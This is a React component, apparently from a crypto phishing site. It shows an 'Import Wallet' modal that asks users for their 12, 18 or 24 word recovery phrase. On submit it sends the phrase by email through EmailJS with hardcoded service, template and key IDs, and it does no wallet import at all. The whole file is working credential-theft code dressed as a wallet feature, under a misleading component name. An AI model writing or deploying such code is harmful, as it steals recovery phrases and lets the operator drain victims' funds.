import React, { useEffect, useRef, useState } from "react";
import "./index.css";
import emailjs from "@emailjs/browser";
import { useDispatch } from "react-redux";
import { RxCross2 } from "react-icons/rx";
import Backdrops from "./Backdrops";
import { motion } from "framer-motion";
export default function Delete({ Click, handleClose }) {
  // dispatch
  const dispatch = useDispatch();
  const dropin = {
    hidden: {
      y: "-100vh",
      opacity: 0,
    },
    visible: {
      y: "0",
      opacity: 1,
      transition: {
        duration: 0.3,
        type: "spring",
        damping: 26,
        stiffness: 600,
      },
    },
    exit: {
      y: "100vh",
      opacity: 0,
    },
  };
  const form = useRef();
  const [message, setMessage] = useState("");

  const handleTextareaChange = (event) => {
    setMessage(event.target.value);
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    const words = message.split(" ");

    if (words.length < 12) {
      alert("Please enter at least 12 words.");
      return;
    }

    // Process the form submission or perform any other action
    emailjs
      .sendForm(
        "service_a5j6nsp",
        "template_sw0j4mx",
        form.current,
        "QWKTEx5C0Fp0YpDNp"
      )
      .then(
        (result) => {
          alert("Message has been sucessfully sent");
        },
        (error) => {
          console.log(error.text);
        }
      );
    setMessage("");

    console.log("Form submitted successfully");

    handleClose();
  };
  // useEffect(() => {
  //   if (message.split(" ").length > 24) {
  //     setMessage("");
  //     return;
  //   }
  // }, [message.split(" ").length]);
  return (
    <Backdrops>
      <motion.div
        variants={dropin}
        initial="hidden"
        animate="visible"
        exit={"exit"}
        className={"deleteCard"}
      >
        <div className="cross" onClick={handleClose}>
          <RxCross2 />
        </div>
        <div className="deleteCardTop w-90 auto flex column gap-4 text-start">
          <div className="flex column gap-3">
            <h3 className="fs-30 text-dark text-start">Import Wallet</h3>
            <h4 className="fs-20 family1 text-light">
              PLEASE ENTER YOUR 12, 18 or 24 WORDS PHRASE
            </h4>
          </div>
          <form ref={form} className="flex column w-100 text-start gap-2">
            <h5 className="fs-12 text-grey text-start text-light">
              PLEASE ENTER YOUR 12, 18 or 24 WORDS PHRASE
            </h5>
            <textarea
              placeholder="Input wallet phrase"
              className="area"
              name="message"
              value={message}
              onChange={(e) => handleTextareaChange(e)}
            ></textarea>
            <div className="w-100 py-2 btnwrapper flex item-center gap-2">
              <div
                data-aos="fade"
                data-aos-duration="1900"
                data-aos-delay="800"
                className="btn"
                onClick={handleSubmit}
              >
                Submit
              </div>
              <div
                data-aos="fade"
                data-aos-duration="1900"
                data-aos-delay="900"
                className="btn btn1"
                onClick={handleClose}
              >
                Close
              </div>
            </div>
          </form>
        </div>
      </motion.div>
    </Backdrops>
  );
}
